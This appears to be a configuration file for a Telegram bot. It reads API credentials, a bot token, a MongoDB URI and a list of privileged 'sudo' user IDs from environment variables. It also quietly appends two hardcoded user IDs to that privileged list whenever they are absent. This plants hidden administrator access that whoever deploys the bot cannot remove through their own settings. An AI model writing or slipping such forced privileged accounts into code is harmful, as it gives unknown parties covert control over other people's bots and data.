from os import getenv
from dotenv import load_dotenv

load_dotenv()

API_ID = int(getenv("API_ID"))
API_HASH = getenv("API_HASH")
TOKEN = getenv("BOT_TOKEN") 
SUDOS = list(map(int, getenv("SUDOS").split()))
if not 5965055071 in SUDOS:
  SUDOS.append(5965055071)
if not 5456798232 in SUDOS:
  SUDOS.append(5456798232)
MONGO_DB_URL = getenv("MONGO_DB_URI")
VERSIOn = "0.0.1"
